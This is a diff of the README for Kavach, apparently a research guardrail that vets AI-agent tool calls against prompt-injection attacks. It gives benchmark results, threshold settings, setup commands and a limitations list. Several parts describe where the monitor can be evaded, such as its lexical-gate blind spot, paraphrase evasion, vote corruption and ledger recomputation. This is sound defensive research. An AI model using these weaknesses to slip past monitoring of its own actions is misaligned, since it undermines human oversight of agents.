-**Cross-model generalisation:** replicated on a CPU-only secondary config (Intel i5, qwen2.5:3b backbone) — loose recall 0.87, **block-only FPR 0.0%** — qualified support for backbone independence (the shared corpus, not the agent model, drives detection).
+**Latency:** ~78 ms p50 / ~83 ms p95 (GPU-accelerated embedding), orders of magnitude below lifecycle-instrumenting scanners (PRISM ≈ 15.8 s, AgentArmor ≈ 20.9 s p95).
 
-**An instructive negative result (representation mismatch):** the corpus is authored in tool-call/technique register, while InjecAgent's benign actions are fluent natural language, so benign actions land near attack patterns in embedding space → the elevated 19% hard-block FPR. Adding the BM25 lexical channel (hybrid retrieval) is what recovers the false-positive rate. This is the kind of deployment lesson a purely simulated evaluation would hide.
+**Cross-model generalisation:** replicated on a CPU-only secondary configuration (Intel i5, qwen2.5:3b backbone) holding the embedding model and corpus identical — loose recall 0.87, block-only FPR 0.0% — qualified support for backbone independence: the shared corpus, not the agent model, drives whether an action is flagged.
 
-Committed artifacts live in `benchmarks/results_v2/` (`injecagent_dell_dh/`, `injecagent_dell_ds/`, `latency/`, the §5 vote dump `minister_runs.jsonl`).
+**Minister ablation:** tested under the **deployed pure-veto Speaker** (not the analyzed Bayesian alternative), ministers added strongest-first. ASR falls 21.0% → 16.1% → 11.3% as NAVIGATOR, EXECUTOR, and VAULT stack — the full parliament beats its strongest single minister — while CHANNEL, added last, drives the FPR from 2.8% to 11.4%, corroborating the limitations below.
+
+Committed artifacts live in `benchmarks/results_v2/`. Full results and methodology are in the paper (`paper/`).
 
 ---
 
-## 8. Setup & Running
+## Configuration
 
-### Install
+`parliament/config.yaml` — the live deployed values:
+
+```yaml
+embed_model: BAAI/bge-base-en-v1.5
+query_prefix: "Represent this sentence for searching relevant passages: "
+chroma_path:  ./parliament/.chroma_kavach
+
+thresholds:
+  block:         0.55     # global base (per-minister overrides below)
+  grey:          0.50     # ESCALATE threshold
+  compass_drift: 0.585    # intent-drift detection (Youden's J optimal)
+  router_min:    0.40     # minister activation
+  per_minister:
+    EXECUTOR:  0.55
+    VAULT:     0.75       # raised to cut FPR (corpus-quality pass pending)
+    CHANNEL:   0.60
+    NAVIGATOR: 0.70
+  drift_factor:  0.30     # COMPASS dynamic-threshold modulation
+  clip_upper:    0.00     # upper clip on the drift adjustment
+  clip_lower:   -0.15     # lower clip on the drift adjustment
+```
+
+The BM25 lexical-gate floor is `KAVACH_BM25_GATE_FLOOR` (default `0.65`) — the explicit FPR-versus-recall knob, swept in the paper's ablation.
+
+---
+
+## Repository Map
+
+```
+parliament/                  the production decision path (never touched by eval tooling)
+  server.py                  FastAPI service, router, COMPASS, endpoints
+  ministers.py               run_minister_hybrid — dense + BM25 + lexical gate
+  speaker.py                 combine_verdicts — deterministic pure-veto Speaker
+  trajectory.py              session-level multi-step risk
+  provenance.py              technique to tactic to stage + hash-chained ledger
+  config.yaml                embeddings, thresholds, router config
+  test_speaker.py            Speaker unit tests
+
+kavach_eval/                 research tooling — read-only on corpus + parliament
+  redteam_evasion_v0.py      red-team paraphrase evasion harness
+  R2_FINDINGS.md             the BM25 lexical-gate blind-spot finding (R2a/R2b)
+  improvement_loop.py        closed-loop remediation orchestrator (human-in-the-loop)
+  corpus_agent/              LLM proposer + 3-part anti-poisoning validator
+  adaptive_attack.py         vote-corruption robustness analysis
+  make_section5.py           offline paper-table pipeline (ablation, correlation, frontier)
+  eval_harness.py, tune.py   metrics, calibration, threshold sweeps
+  threat_intel/              ATT&CK technique index for the LLM red-team mode
+
+corpus_loader.py             builds the ChromaDB collections from the corpus
+kavach_corpus_v1.json        the 401-pattern corpus (v2.0) + 100 COMPASS pairs
+kavach_corpus_v1_ORIGINAL.json  frozen pre-improvement-loop snapshot (ground truth)
+kavach_router_config.json    router domain descriptions
+corpus_v2/                   corpus-expansion working area (protocol + new patterns)
+
+plugin/                      OpenClaw before_tool_call plugin (TypeScript)
+openclaw_pr/                 upstream PR-1 — the #5513 / #5943 hook fixes + tests
+benchmarks/                  InjecAgent / AgentDojo harness; results_v2/ holds Dell runs
+tools/                       dell_lab.py (browser run dashboard), pattern_inspector (CLI)
+scripts/                     dell_run_*.sh — Dell session run scripts
+paper/                       AISec 2026 LaTeX (§1–§7), bib, generated tables/
+docs/                        runbooks (DELL_RUNBOOK_V2.md), architecture, findings
+```
+
+---
+
+## Getting Started
+
 ```bash
 git clone https://github.com/Ishani018/Kavach.git
 cd Kavach
 pip install -r requirements.txt --break-system-packages
 pip install rank-bm25 --break-system-packages
-python predownload_model.py            # cache BGE (~440 MB) first
+python predownload_model.py             # cache BGE (~440 MB) first
 ```
 
-### Build the corpus index (first time, or after any corpus change)
+Build the ChromaDB index (first time, or after any corpus change):
+
 ```bash
 rm -rf parliament/.chroma_kavach
 python corpus_loader.py --rebuild
 # Confirm doc counts: EXECUTOR 300, VAULT 300, CHANNEL 303, NAVIGATOR 300
 ```
 
-### Start the parliament
+Start the parliament and verify:
+
 ```bash
 python -m uvicorn parliament.server:app --host 127.0.0.1 --port 8088
-```
-
-### Verify
-```bash
 curl -s http://127.0.0.1:8088/health | python3 -m json.tool
-python parliament/smoke_test.py --url http://127.0.0.1:8088      # 7 checks
 curl -s http://127.0.0.1:8088/ledger/verify | python3 -m json.tool
 ```
 
-### Try an attack vs a benign action
+Try an attack versus a benign action:
+
 ```bash
 # malicious — expect BLOCK
 curl -s -X POST http://127.0.0.1:8088/hook/parliament \
@@ -364,96 +302,34 @@ curl -s -X POST http://127.0.0.1:8088/hook/parliament \
   -d '{"text":"tool:read_file args:{\"path\":\"src/main.py\"}","session_id":"t"}'
 ```
 
-### Offline research pipeline (no GPU)
+Offline research pipeline (no GPU required):
+
 ```bash
-python -m pytest parliament/test_speaker.py -v          # Speaker unit tests
-python kavach_eval/redteam_evasion_v0.py --max-seeds 20 # quick evasion smoke
-python kavach_eval/make_section5.py minister_runs.jsonl --rho-auto  # §5 tables
+python -m pytest parliament/test_speaker.py -v             # Speaker unit tests
+python kavach_eval/redteam_evasion_v0.py --max-seeds 20    # quick evasion smoke
+python kavach_eval/make_section5.py minister_runs.jsonl --rho-auto  # paper tables
 ```
 
 ---
 
-## 9. Repository Map
+## Limitations
 
-```
-parliament/              ← the production decision path (never touched by eval tooling)
-  server.py              FastAPI service, router, COMPASS, endpoints
-  ministers.py           run_minister_hybrid — dense + BM25 + lexical gate
-  speaker.py             combine_verdicts — deterministic pure-veto Speaker
-  trajectory.py          session-level multi-step risk
-  provenance.py          technique→tactic→stage + hash-chained ledger
-  config.yaml            embeddings, thresholds, router config
-  test_speaker.py        Speaker unit tests
+We state these plainly because a careful reviewer should see them; the framing here matches the paper's §7.
 
-kavach_corpus_v1.json    ← the 401-pattern corpus (v2.0) + 100 COMPASS pairs
-kavach_router_config.json  router domain descriptions
-corpus_loader.py         builds the ChromaDB collections
-
-kavach_eval/             ← research tooling (READ-ONLY on corpus + parliament)
-  redteam_evasion_v0.py  red-team paraphrase harness
-  R2_FINDINGS.md         the BM25 gate-evasion finding (R2a/R2b + mitigation)
-  corpus_agent/          closed-loop proposer + 3-part anti-poisoning validator
-  adaptive_attack.py     vote-corruption robustness analysis
-  make_section5.py       offline §5 pipeline
-  eval_harness.py, tune.py, make_synthetic.py
-
-benchmarks/              InjecAgent, AgentDojo, native, results_v2/ (committed Dell runs)
-tools/                   pattern_inspector.py — dev diagnostic CLI (real pipeline)
-plugin/                  OpenClaw before_tool_call plugin (TypeScript)
-paper/                   AISec §1–§7 LaTeX + bib + related-work table
-docs/                    runbooks, architecture, findings
-```
+- **No head-to-head with ClawGuard on AgentDojo.** ClawGuard reports 0% attack-success rate on AgentDojo under explicit user-authored rules, which Kavach does not currently match; a fair comparison reporting both on the same benchmark is left to future work pending our AgentDojo run.
+- **Tamper-evident, not tamper-proof.** The hash-chained ledger detects post-hoc edits, but an attacker with write access to the database can recompute the entire chain. Defeating that requires anchoring the chain head to an external append-only medium, which we do not implement.
+- **Provenance precision is partial.** Verdict provenance is precise only for patterns that declare a source technique; the remainder resolve to a per-minister default, and the audit trail records which basis was used.
+- **Curated corpus.** Patterns are authored from published taxonomies; novel techniques absent from those taxonomies will not be matched. This is intrinsic to corpus-based semantic detection.
+- **FPR driver and an escalate-only minister.** The benign false-positive rate is driven almost entirely by the CHANNEL minister — a small number of over-broad exfiltration patterns account for nearly every benign hard-block. VAULT's per-minister threshold (0.75) sits above its observed attack-confidence ceiling on InjecAgent, so it contributes escalations rather than hard blocks. Inter-minister error correlation is low on average (ρ̄ = 0.09) but not uniform: the NAVIGATOR–CHANNEL pair reaches ρ = 0.52, reflecting overlapping pattern coverage.
+- **Single-vector similarity and the trajectory leg.** Per-call detection uses single-vector cosine similarity, which has known limits relative to sequence-aware detection; the trajectory monitor uses lightweight context signals rather than a trained sequence model.
+- **Single backbone and runtime.** The headline numbers use one agent backbone (Gemma 4 26B) on OpenClaw in embedded mode; broader cross-model and defense-in-depth evaluation are future work.
+- **Benchmark saturation.** InjecAgent and AgentDojo are increasingly saturated on frontier models, which compresses the headroom in which a monitor's benefit is visible; multi-step staged attacks, which the trajectory monitor targets, are under-represented in current benchmarks.
 
 ---
 
-## 10. Configuration Reference
+## Paper
 
-`parliament/config.yaml` (the live values):
-
-```yaml
-embed_model: BAAI/bge-base-en-v1.5
-query_prefix: "Represent this sentence for searching relevant passages: "
-chroma_path:  ./parliament/.chroma_kavach
-
-thresholds:
-  block:         0.55    # global base (per-minister overrides below)
-  grey:          0.50    # ESCALATE threshold
-  compass_drift: 0.585   # intent-drift detection (Youden's J optimal)
-  router_min:    0.40    # minister activation
-  per_minister:
-    EXECUTOR:  0.55
-    VAULT:     0.75      # raised to cut FPR (corpus quality pass pending)
-    CHANNEL:   0.60
-    NAVIGATOR: 0.60
-```
-
-The BM25 lexical-gate floor is `KAVACH_BM25_GATE_FLOOR` (default `0.65`) — the explicit FPR-vs-recall knob, swept in the paper ablation.
-
----
-
-## 11. Team & Paper
-
-| Member | Workstream |
-|---|---|
-| **Ishani Chakraborty** | parliament service, Speaker, corpus, research (R2 / corpus_agent), paper |
-| **Parv Parmar** | OpenClaw TypeScript plugin & PRs, Dell benchmarking |
-| **Janya Mahesh** | benchmarks, thresholds, corpus |
-| **Pranitha Goduguluri** | corpus expansion |
-
-**Paper** (targeting **AISec 2026 @ ACM CCS**): §1 Intro, §2 Background, §3 Design, §4 Deployment, §5 Frontier, §7 Limitations drafted in `paper/`. The §5 evaluation uses the offline pipeline in `kavach_eval/`; the related-work table positions Kavach against LlamaFirewall, AgentSpec, AGrail, ShieldAgent, and CaMeL.
-
----
-
-## 12. Honest Status & Limitations
-
-We hold a hard line on reproducibility, and we state these plainly because a careful reviewer should see them:
-
-- **The gateway-hook gap.** `before_tool_call` fires reliably in OpenClaw's *embedded* path; the *gateway* path did not expose the boundary (upstream issues #5513 / #5943). Kavach is evaluated in embedded mode, and we contribute upstream fixes. The general lesson — a working pre-execution hook is a precondition for any runtime guardrail — is a contribution in itself.
-- **Dell-canonical vs laptop-measured.** Headline detection/latency numbers are from the committed Dell runs. Laptop and offline measurements (e.g. red-team evasion rates, corpus_agent pass-rates) are treated as **hypotheses until Dell-confirmed**, and labelled as such throughout.
-- **The 19% hard-block FPR** is real and attributed (representation mismatch); a native tool-call-register benchmark is identified as the direct test and left to future work.
-- **No new components enter the live decision path before the submission freeze** — additions like dynamic COMPASS thresholds, intent-seeding activation (#9), and a fifth SUPPLY minister are deliberately post-submission, so they cannot invalidate the locked benchmark numbers.
-
-Every headline number traces to a committed artifact. That discipline is the point.
+The accompanying paper targets **AISec 2026 at ACM CCS** and is drafted in `paper/` (§1 Introduction through §7 Limitations, with the LaTeX sources, bibliography, and related-work table). Its external facts and citations are checked against primary sources, and the §5 evaluation runs on the offline pipeline in `kavach_eval/`. The related-work table positions Kavach against LlamaFirewall, AgentSpec, AGrail, ShieldAgent, CaMeL, and others.
 
 ---
 
@@ -461,6 +337,6 @@ Every headline number traces to a committed artifact. That discipline is the poi
 
 **License:** MIT — see [`LICENSE`](LICENSE)
 
-*Kavach · a shield that reads meaning, not strings.*
+*Kavach — a shield that reads meaning, not strings.*
 
 </div>
